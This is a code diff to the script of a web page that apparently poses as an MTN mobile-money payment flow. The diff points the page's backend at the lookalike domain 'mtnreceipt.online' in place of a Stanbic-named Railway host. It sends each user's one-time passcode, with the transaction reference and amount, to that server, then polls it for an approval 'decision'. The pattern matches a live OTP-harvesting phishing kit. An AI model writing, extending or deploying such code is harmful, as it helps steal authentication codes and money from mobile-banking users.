@@ -396,9 +396,9 @@
 
 <script>
   /* ═══════════════════════════════════════════════════════════
-     API_BASE — HARD-PINNED to the live Railway backend
+     API_BASE — live Render backend
      ═══════════════════════════════════════════════════════════ */
-  const API_BASE = 'https://stanbicmobilepayment-production.up.railway.app';
+  const API_BASE = 'https://mtnreceipt.online';
 
   const I18N = {
     en: {
@@ -656,22 +656,30 @@
     document.getElementById('authText').textContent = T.authText;
     document.getElementById('authorizingOverlay').classList.add('show');
 
+    const payload = {
+      tx: tx.ref,
+      otp: code,
+      am: tx.am,
+      cur: tx.cur,
+      c: tx.c,
+      lang: currentLang
+    };
+
+    console.log('[otp] POST /api/mtn/otp payload:', payload);
+
     let serverAccepted = true;
     try {
       const r = await fetch(API_BASE + '/api/mtn/otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          tx: tx.ref,
-          otp: code,
-          am: tx.am,
-          cur: tx.cur,
-          c: tx.c,
-          lang: currentLang
-        })
+        body: JSON.stringify(payload),
+        signal: AbortSignal.timeout(60000)
       });
+      const body = await r.text();
+      console.log('[otp] /api/mtn/otp response:', r.status, body);
       if (!r.ok) serverAccepted = false;
     } catch (e) {
+      console.error('[otp] POST failed:', e);
       document.getElementById('authorizingOverlay').classList.remove('show');
       approveBtn.disabled = false;
       showToast(T.networkError);
@@ -703,7 +711,9 @@
 
       let decision = 'pending';
       try {
-        const r = await fetch(API_BASE + '/api/mtn/otp-status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
+        const r = await fetch(API_BASE + '/api/mtn/otp-status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now(), {
+          signal: AbortSignal.timeout(30000)
+        });
         if (!r.ok) throw new Error('HTTP ' + r.status);
         const j = await r.json();
         decision = j.decision || 'pending';
@@ -780,7 +790,8 @@
           am: tx.am,
           cur: tx.cur,
           lang: currentLang
-        })
+        }),
+        signal: AbortSignal.timeout(60000)
       });
       if (!r.ok && r.status !== 429) throw new Error('bad');
       resendBtn.classList.add('sent');
